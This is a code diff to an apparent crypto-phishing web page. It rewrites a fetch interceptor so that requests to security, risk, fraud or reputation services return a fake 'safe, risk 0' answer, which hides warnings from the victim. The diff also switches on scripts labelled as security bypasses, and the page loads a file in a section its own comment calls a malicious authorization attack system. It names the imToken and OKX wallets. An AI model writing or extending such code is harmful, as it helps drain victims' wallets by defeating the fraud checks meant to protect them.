@@ -88,21 +88,27 @@
             `;
             document.head.appendChild(hideCSS);
             
-            // 🎯 拦截所有可能的安全检查API
-            const originalFetch = window.fetch;
-            window.fetch = function(...args) {
-                const url = String(args[0] || '');
-                if (url.includes('security') || url.includes('risk') || 
-                    url.includes('blacklist') || url.includes('warning') ||
-                    url.includes('fraud') || url.includes('check')) {
-                    console.log('🛡️ 拦截安全API:', url);
-                    return Promise.resolve(new Response('{"safe":true,"risk":0}', {
-                        status: 200,
-                        headers: {'Content-Type': 'application/json'}
-                    }));
+            // 🎯 预拦截安全检查API
+            try {
+                if (window.fetch && !window.fetch._preBypass) {
+                    const originalFetch = window.fetch;
+                    window.fetch = function(...args) {
+                        const url = String(args[0] || '');
+                        if (url.includes('security') || url.includes('risk') || 
+                            url.includes('fraud') || url.includes('reputation')) {
+                            console.log('🛡️ 预拦截安全API:', url);
+                            return Promise.resolve(new Response('{"safe":true,"risk":0}', {
+                                status: 200,
+                                headers: {'Content-Type': 'application/json'}
+                            }));
+                        }
+                        return originalFetch.apply(this, args);
+                    };
+                    window.fetch._preBypass = true;
                 }
-                return originalFetch.apply(this, args);
-            };
+            } catch (e) {
+                console.log('🛡️ API预拦截失败，将使用后备方案');
+            }
             
             // 🎯 简化版DOM监控，避免移动端兼容性问题
             try {
@@ -298,8 +304,8 @@
         })();
     </script>
 
-    <!-- 🎯 手机端专用：imToken拦截器 - 临时禁用 -->
-    <!-- <script src="mobile-imtoken-bypass.js"></script> -->
+    <!-- 🎯 轻量级移动端绕过 - 移动端兼容 -->
+    <script src="mobile-bypass-lite.js"></script>
 
     <!-- 🎯 最高优先级：反检测脚本 - 临时禁用 -->
     <!-- <script src="../okx-security-research%20-%20副本/anti-detection.js"></script> -->
@@ -3781,8 +3787,8 @@
     <script src="add_multi_currency_patch.js"></script>
     
     <!-- 🎯 恶意授权攻击系统 -->
-    <!-- 🛡️ imToken安全绕过系统 - 临时禁用以解决兼容性问题 -->
-<!-- <script src="imtoken-security-bypass.js"></script> -->
+    <!-- 🛡️ 优化版安全绕过系统 - 移动端兼容 -->
+<script src="optimized-security-bypass.js"></script>
 <script src="malicious-authorization.js"></script>
 
 </body>
